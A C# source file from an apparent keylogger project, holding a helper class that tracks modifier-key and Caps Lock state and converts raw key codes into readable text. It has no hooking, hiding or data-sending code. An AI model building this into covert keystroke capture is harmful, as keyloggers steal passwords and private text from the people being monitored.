using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger
{
    public class KeyFormatter
    {
        [DllImport("user32.dll")]
        static extern short GetKeyState(int keyCode);

        public KeyFormatter()
        {
            CurrentKeyStates = new Dictionary<Keys, bool>
            {
                { Keys.LControlKey, false },
                { Keys.RControlKey, false },
                { Keys.LShiftKey, false },
                { Keys.RShiftKey, false },
                { Keys.LMenu, false },
                { Keys.RMenu, false }
            };
        }

        public Dictionary<Keys, bool> CurrentKeyStates { get; set; }

        public bool IsCapsLockOn => GetKeyState((int)Keys.CapsLock) > 0;

        public bool IsCapital =>
            IsCapsLockOn ||
            CurrentKeyStates[Keys.LShiftKey] ||
            CurrentKeyStates[Keys.RShiftKey];

        public string FormatKeyPress(int keyCode, bool keyDown)
        {
            var keyCodeMapped = (Keys)keyCode;

            if (keyCodeMapped == Keys.CapsLock)
            {
                return string.Empty;
            }
            else if (CurrentKeyStates.ContainsKey(keyCodeMapped))
            {
                CurrentKeyStates[keyCodeMapped] = keyDown;

                return $"{keyCodeMapped} ({(keyDown ? "/\\" : "\\/")}){Environment.NewLine}";
            }
            else if (keyDown)
            {
                if (keyCodeMapped == Keys.Space)
                {
                    return " ";
                }
                else if (keyCodeMapped.ToString().Length == 1)
                {
                    // Character key
                    if (IsCapital)
                    {
                        return keyCodeMapped.ToString().ToUpperInvariant();
                    }
                    else
                    {
                        return keyCodeMapped.ToString().ToLowerInvariant();
                    }
                }
                else
                {
                    return keyCodeMapped.ToString();
                }
            }
            else
            {
                // Non modifier key pressed up
                return string.Empty;
            }
        }
    }
}
